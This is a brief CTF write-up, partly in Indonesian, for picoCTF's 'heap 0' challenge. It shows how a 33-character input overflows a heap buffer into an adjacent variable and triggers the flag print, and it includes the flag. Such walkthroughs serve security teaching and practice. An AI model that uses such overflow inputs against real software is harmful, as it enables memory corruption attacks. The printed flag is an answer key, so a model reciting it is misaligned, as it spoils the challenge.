<h1>heap 0</h1>
<h3>Description</h3>
  <p>Can you control your overflow?
Download the binary <a href="https://artifacts.picoctf.net/c_tethys/31/chall">here</a>.
Download the source <a href="https://artifacts.picoctf.net/c_tethys/31/chall.c">here</a>.
Additional details will be available after launching your challenge instance.</p>
<h3>Solution</h3>
<pre>
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x55be660396b0  ->   pico
+-------------+----------------+
[*]   0x55be660396d0  ->   bico
+-------------+----------------+
</pre>
<p>Selisih address variabel "pico" dan "bico" = 32</p>

```
>>> 0x55be660396b0-0x55be660396d0
-32
```
<p>Fungsi check_win()</p>

```c
void check_win() {
    if (strcmp(safe_var, "bico") != 0) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}
```
<p>Win jika value safe_var tidak sama dengan "bico", input string dengan panjang 32 atau lebih</p>

```console
1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: 123456789012345678901234567890123

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 3


Take a look at my variable: safe_var = 3


1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{my_first_heap_overflow_749119de}
```

<h3>Flag</h3>
<pre>
  picoCTF{my_first_heap_overflow_749119de}
</pre>
